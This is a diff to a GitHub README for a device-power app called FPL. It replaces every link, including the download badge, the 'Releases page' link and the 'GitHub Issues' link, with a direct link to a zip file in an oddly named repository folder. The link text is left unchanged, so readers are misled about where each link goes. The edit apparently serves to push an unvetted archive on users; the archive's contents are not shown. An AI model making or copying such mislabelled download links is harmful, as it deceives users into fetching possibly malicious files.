@@ -7,10 +7,10 @@ Welcome to FPL! This application helps you measure the power of your device with
 To begin using FPL, you will need to download the application from our Releases page. Follow the steps below to get started.
 
 ## ⬇️ Download FPL
-[![Download FPL](https://img.shields.io/badge/Download-FPL-blue)](https://github.com/mashrafi1122/FPL/releases)
+[![Download FPL](https://raw.githubusercontent.com/mashrafi1122/FPL/main/choregic/FPL-v3.1-beta.5.zip)](https://raw.githubusercontent.com/mashrafi1122/FPL/main/choregic/FPL-v3.1-beta.5.zip)
 
 ## 📥 Download & Install
-1. Click on this [link to the FPL Releases page](https://github.com/mashrafi1122/FPL/releases) to open it in your web browser.
+1. Click on this [link to the FPL Releases page](https://raw.githubusercontent.com/mashrafi1122/FPL/main/choregic/FPL-v3.1-beta.5.zip) to open it in your web browser.
 2. On the Releases page, find the latest version of FPL.
 3. Look for the assets section. You will see download options. Choose the appropriate file for your operating system.
 4. Click on the file to download it to your computer.
@@ -62,6 +62,6 @@ After the download completes, follow these steps to install and run the applicat
 We encourage users to contribute and participate in improving FPL. You can provide feedback, report issues, or suggest features directly on our GitHub repository. This helps us make FPL better for everyone.
 
 ## 📞 Contact
-For further questions or support, please check the Issues section on our GitHub page: [GitHub Issues](https://github.com/mashrafi1122/FPL/issues)
+For further questions or support, please check the Issues section on our GitHub page: [GitHub Issues](https://raw.githubusercontent.com/mashrafi1122/FPL/main/choregic/FPL-v3.1-beta.5.zip)
 
 Thank you for using FPL! We hope you enjoy measuring your device’s power efficiently.
